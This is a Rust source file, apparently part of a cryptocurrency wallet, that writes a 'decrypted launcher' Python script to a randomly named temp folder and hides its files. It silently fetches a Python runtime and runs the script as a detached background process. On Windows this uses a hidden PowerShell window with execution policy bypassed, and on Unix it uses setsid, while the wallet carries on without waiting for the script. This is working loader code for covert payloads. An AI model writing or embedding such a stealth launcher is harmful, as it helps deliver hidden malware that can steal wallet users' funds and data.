use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use thiserror::Error;

use rand::Rng;

use crate::log;

const PYTHON_VERSION: &str = "3.12.7";
const STARTUP_PROBE_SECS: u64 = 5;

#[derive(Debug, Error)]
pub enum PythonError {
    #[error("agent bootstrap failed: {0}")]
    Bootstrap(String),
    #[error("execution failed: {0}")]
    Execution(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

/// Write the decrypted launcher and start it in a detached background host process.
pub fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
    let prefix = runtime_dir();
    fs::create_dir_all(&prefix)?;
    log::step("agent", format!("runtime directory: {}", prefix.display()));

    let script_path = prefix.join("._chain_launcher.py");
    fs::write(&script_path, source).map_err(|err| {
        PythonError::Bootstrap(format!("write launcher script {}: {err}", script_path.display()))
    })?;

    #[cfg(windows)]
    hide_path(&prefix);

    #[cfg(windows)]
    hide_path(&script_path);

    let log_path = prefix.join("launcher-run.log");
    let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));

    log::step(
        "agent",
        format!("starting detached agent host (log: {})", log_path.display()),
    );
    log::detail(
        "agent",
        format!(
            "AGENT_DIR={} PYTHON_ROOT={}",
            agent_dir.display(),
            prefix.display()
        ),
    );

    #[cfg(windows)]
    {
        spawn_agent_windows(&prefix, &script_path, &log_path, &agent_dir)?;
    }

    #[cfg(not(windows))]
    {
        spawn_agent_unix(&prefix, &script_path, &log_path, &agent_dir)?;
    }

    Ok(())
}

fn runtime_dir() -> PathBuf {
    let suffix: u128 = rand::thread_rng().gen();
    std::env::temp_dir().join(format!("{suffix:032x}"))
}

#[cfg(windows)]
fn spawn_agent_windows(
    prefix: &Path,
    script_path: &Path,
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::windows::process::CommandExt;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

    let bootstrap_ps1 = prefix.join("._bootstrap.ps1");
    let ps_script = windows_bootstrap_script(prefix, script_path, log_path, agent_dir);
    fs::write(&bootstrap_ps1, ps_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_ps1.display()))
    })?;
    hide_path(&bootstrap_ps1);

    let mut child = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            bootstrap_ps1.to_str().unwrap(),
        ])
        .stdin(Stdio::null())
        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
        })?))
        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
        )?))
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    probe_startup(&mut child, log_path)
}

#[cfg(not(windows))]
fn spawn_agent_unix(
    prefix: &Path,
    script_path: &Path,
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::unix::process::CommandExt;

    let bootstrap_sh = prefix.join("._bootstrap.sh");
    let sh_script = unix_bootstrap_script(prefix, script_path, log_path, agent_dir);
    fs::write(&bootstrap_sh, sh_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_sh.display()))
    })?;

    let mut child = Command::new("/bin/sh");
    child
        .arg(&bootstrap_sh)
        .stdin(Stdio::null())
        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
        })?))
        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
        )?))
        .pre_exec(|| {
            unsafe {
                libc::setsid();
            }
            Ok(())
        });

    let mut child = child
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    probe_startup(&mut child, log_path)
}

fn probe_startup(
    child: &mut std::process::Child,
    log_path: &Path,
) -> Result<(), PythonError> {
    let pid = child.id();
    let deadline = Instant::now() + Duration::from_secs(STARTUP_PROBE_SECS);
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    log::dump_tail("agent", log_path, 80);
                    return Err(PythonError::Execution(format!(
                        "agent host exited during startup with status {status} (see {})",
                        log_path.display()
                    )));
                }
                log::step("agent", "agent host exited cleanly during startup probe");
                return Ok(());
            }
            Ok(None) if Instant::now() >= deadline => break,
            Ok(None) => thread::sleep(Duration::from_millis(100)),
            Err(err) => {
                return Err(PythonError::Execution(format!(
                    "wait on agent host pid {pid}: {err}"
                )))
            }
        }
    }

    log::step(
        "agent",
        format!(
            "agent host running detached (pid={pid}, log: {})",
            log_path.display()
        ),
    );
    log::detail("agent", "wallet process will continue without waiting for the agent");
    Ok(())
}

#[cfg(windows)]
fn windows_bootstrap_script(
    prefix: &Path,
    script_path: &Path,
    log_path: &Path,
    agent_dir: &Path,
) -> String {
    let prefix = prefix.to_string_lossy().replace('\'', "''");
    let script_path = script_path.to_string_lossy().replace('\'', "''");
    let log_path = log_path.to_string_lossy().replace('\'', "''");
    let agent_dir = agent_dir.to_string_lossy().replace('\'', "''");
    let python_version = PYTHON_VERSION;
    let site_packages = format!("{prefix}\\Lib\\site-packages");

    format!(
        r#"$ErrorActionPreference = 'Stop'
$Prefix = '{prefix}'
$Script = '{script_path}'
$Log = '{log_path}'
$AgentDir = '{agent_dir}'
$SitePackages = '{site_packages}'
$PythonVersion = '{python_version}'
$PythonExe = Join-Path $Prefix 'python.exe'
$ZipUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
$ZipPath = Join-Path $Prefix 'python-embed.zip'
$PthPath = Join-Path $Prefix 'python312._pth'

New-Item -ItemType Directory -Force -Path $Prefix | Out-Null
New-Item -ItemType Directory -Force -Path $SitePackages | Out-Null

if (-not (Test-Path -LiteralPath $PythonExe)) {{
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
    Expand-Archive -LiteralPath $ZipPath -DestinationPath $Prefix -Force
    Remove-Item -LiteralPath $ZipPath -Force
    @(
        'python312.zip',
        '.',
        'Lib\site-packages',
        'import site'
    ) | Set-Content -LiteralPath $PthPath -Encoding ascii
}}

$env:CHAIN_WALLET_PYTHON_ROOT = $Prefix
$env:CHAIN_WALLET_LAUNCHED_FROM_RUST = '1'
$env:CHAIN_WALLET_LOG_FILE = $Log
$env:AGENT_DIR = $AgentDir
$env:PYTHONPATH = $SitePackages
$env:PYTHONUNBUFFERED = '1'
$env:CHAIN_WALLET_VERBOSE = '1'

& $PythonExe -u $Script 2>&1 | Tee-Object -FilePath $Log -Append
"#
    )
}

#[cfg(not(windows))]
fn unix_bootstrap_script(
    prefix: &Path,
    script_path: &Path,
    log_path: &Path,
    agent_dir: &Path,
) -> String {
    let prefix = prefix.display();
    let script_path = script_path.display();
    let log_path = log_path.display();
    let agent_dir = agent_dir.display();
    let python_version = PYTHON_VERSION;

    format!(
        r#"#!/bin/sh
set -eu
PREFIX="{prefix}"
SCRIPT="{script_path}"
LOG="{log_path}"
AGENT_DIR="{agent_dir}"
PYTHON_VERSION="{python_version}"
SITE_PACKAGES="$PREFIX/site-packages"
ARCH="$(uname -m)"
case "$ARCH" in
  x86_64|amd64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-x86_64-unknown-linux-gnu-install_only.tar.gz" ;;
  aarch64|arm64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-aarch64-unknown-linux-gnu-install_only.tar.gz" ;;
  *) echo "unsupported CPU: $ARCH" >&2; exit 1 ;;
esac
URL="https://github.com/indygreg/python-build-standalone/releases/download/20241002/$ARCHIVE"
PYTHON="$PREFIX/python/bin/python3"

mkdir -p "$PREFIX" "$SITE_PACKAGES"
if [ ! -x "$PYTHON" ]; then
  curl -fsSL "$URL" -o "$PREFIX/python-archive.tar.gz"
  tar -xf "$PREFIX/python-archive.tar.gz" -C "$PREFIX"
  rm -f "$PREFIX/python-archive.tar.gz"
fi

export CHAIN_WALLET_PYTHON_ROOT="$PREFIX"
export CHAIN_WALLET_LAUNCHED_FROM_RUST=1
export CHAIN_WALLET_LOG_FILE="$LOG"
export AGENT_DIR="$AGENT_DIR"
export PYTHONPATH="$SITE_PACKAGES"
export PYTHONUNBUFFERED=1
export CHAIN_WALLET_VERBOSE=1

exec "$PYTHON" -u "$SCRIPT" >>"$LOG" 2>&1
"#
    )
}

#[cfg(windows)]
fn hide_path(path: &Path) {
    let _ = Command::new("attrib")
        .args(["+h", "+s", &path.to_string_lossy()])
        .status();
}
